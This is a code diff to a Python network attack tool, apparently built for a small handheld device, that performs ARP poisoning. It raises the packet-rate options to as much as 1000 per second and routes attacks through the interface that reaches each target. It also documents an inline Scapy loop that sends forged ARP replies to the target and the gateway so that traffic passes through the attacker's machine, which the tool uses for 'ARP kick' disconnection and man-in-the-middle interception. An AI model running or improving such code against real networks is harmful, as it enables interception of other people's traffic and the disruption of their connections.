@@ -2033,8 +2033,8 @@ def do_network_scan():
 
 def _ask_pps():
     """Select packets per second using a spinner (no list scrolling)."""
-    rates = [5, 10, 25, 50, 100]
-    idx = 2  # start at 25 pkt/s
+    rates = [5, 10, 25, 50, 100, 250, 500, 1000]
+    idx = 4  # start at 100 pkt/s
     while True:
         with draw_lock:
             _draw_toolbar()
@@ -2057,6 +2057,19 @@ def _ask_pps():
         elif btn in ("KEY_LEFT_PIN", "KEY1_PIN", "KEY3_PIN"):
             return None
         # else continue
+
+
+def _get_interface_for_ip(ip):
+    """Return the network interface used to reach the given IP."""
+    try:
+        rc, out = _run(["ip", "route", "get", ip], timeout=2)
+        import re
+        m = re.search(r"dev\s+(\S+)", out)
+        if m:
+            return m.group(1)
+    except:
+        pass
+    return ktox_state["iface"]  # fallback
 
 
 def _get_mac_arping(ip, iface, timeout=2):
@@ -2134,13 +2147,14 @@ def _scapy_restore(target_ip, target_mac, gw_ip, gw_mac, iface, my_mac):
 
 def do_arp_kick(target_ip, pps=10):
     """Bidirectional ARP poison (target + gateway) at configurable PPS."""
-    iface = ktox_state["iface"]
+    # Find correct interface for the target
+    iface = _get_interface_for_ip(target_ip)
     gw    = ktox_state["gateway"]
     if not gw:
         Dialog_info("No gateway!\nRun scan first.", wait=True)
         return
 
-    Dialog_info(f"Resolving MACs…\n{target_ip}", wait=False, timeout=1)
+    Dialog_info(f"Resolving MACs…\n{target_ip} via {iface}", wait=False, timeout=1)
     target_mac = _scapy_resolve(target_ip, iface)
     gw_mac     = _scapy_resolve(gw, iface)
     if not target_mac:
@@ -2159,14 +2173,17 @@ def do_arp_kick(target_ip, pps=10):
         f"g_ip='{gw}';g_mac='{gw_mac}';"
         f"iv={interval!r};"
         "while True:"
+        "  # Poison target: gateway IP is at my MAC"
         "  sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
-        "  g_mac and sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
+        "  # Poison gateway: target IP is at my MAC"
+        "  if g_mac:"
+        "    sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
         "  time.sleep(iv)"
     )
     proc = subprocess.Popen(["python3", "-c", script],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     ktox_state["running"] = f"ARP KICK {pps}/s"
-    Dialog_info(f"ARP KICK\n{target_ip}\n{pps} pkt/s bidir\nKEY3=stop", wait=True)
+    Dialog_info(f"ARP KICK\n{target_ip}\n{pps} pkt/s bidir\nvia {iface}\nKEY3=stop", wait=True)
     proc.terminate()
     try:
         proc.wait(timeout=2)
@@ -2180,13 +2197,13 @@ def do_arp_kick(target_ip, pps=10):
 
 def do_mitm(target_ip):
     """Bidirectional ARP MITM using Scapy. Enables IP forwarding."""
-    iface = ktox_state["iface"]
+    iface = _get_interface_for_ip(target_ip)
     gw    = ktox_state["gateway"]
     if not gw:
         Dialog_info("No gateway!\nRun scan first.", wait=True)
         return
 
-    Dialog_info(f"Resolving MACs…\n{target_ip}", wait=False, timeout=1)
+    Dialog_info(f"Resolving MACs…\n{target_ip} via {iface}", wait=False, timeout=1)
     target_mac = _scapy_resolve(target_ip, iface)
     gw_mac     = _scapy_resolve(gw, iface)
     if not target_mac or not gw_mac:
@@ -2480,7 +2497,7 @@ def do_start_mitm_suite():
     tgt = _pick_host()
     if not tgt:
         return
-    iface = ktox_state["iface"]
+    iface = _get_interface_for_ip(tgt)
     gw    = ktox_state["gateway"]
     if not gw:
         Dialog_info("No gateway!\nRun scan first.", wait=True)
